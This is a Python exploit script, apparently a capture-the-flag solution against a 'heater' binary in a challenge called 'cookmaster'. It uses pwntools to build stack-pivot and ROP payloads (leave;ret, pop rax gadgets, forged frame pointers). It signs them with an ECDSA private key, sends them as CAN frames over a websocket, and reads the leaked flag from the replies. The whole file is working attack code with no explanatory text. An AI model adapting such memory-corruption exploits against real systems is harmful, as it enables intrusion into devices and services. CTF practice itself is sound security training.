#!/usr/bin/env python3
import os
import asyncio
import websockets
os.environ['PWNLIB_NOTERM'] = '1'
import json
from hashlib import sha256
from ecdsa import SigningKey
from pwn import *

context.binary = elf = ELF("../cookmaster-bin/heater/heater", checksec=False)
MSGID_TEMP = 0xF015

with open('./privkey') as f:
  sk = SigningKey.from_pem(f.read())

LEAVE = elf.search(asm('leave; ret')).__next__()
POP_RAX = 0x40267d
RET = LEAVE+1
OFFSET=int(sys.argv[3])

fake = flat(
  p32(5), # sending fd
  elf.symbols['temp_target']+0x4+0x10,  
  elf.sym['main']+0x3c,
  elf.symbols['temp_target']+0x4,  
  elf.sym['send_temperature']+0xc8
)
fsig = sk.sign(fake, hashfunc=sha256)
payload = b64e(fsig + fake)
fak = f'canframe:{MSGID_TEMP}:{payload}'

message = flat(
  p32(0x6fe1be2),
  elf.symbols['temp_target']+0x4+0x10, # rbp
  POP_RAX,
  elf.sym['flag']+OFFSET,
)
sig = sk.sign(message, hashfunc=sha256)
payload = b64e(sig + message)
msg = f'canframe:{MSGID_TEMP}:{payload}'

if __name__ == '__main__':
    HOST = sys.argv[1]
    TEAM_TOKEN = sys.argv[2]
    URL = f'{HOST}/{TEAM_TOKEN}/ws'

    async def exploit():
        async with websockets.connect(URL) as websocket:
            await websocket.send(fak)
            await asyncio.sleep(0.1)
            await websocket.send(msg)
    
            async for message in websocket:
                m = json.loads(message)
                if m['msg'] != 'can' or m['msgId'] != 18:
                    continue

                data = bytes.fromhex(m['data'])
                if data.isascii():
                    print(data.decode().strip())
                    break

    asyncio.run(exploit())
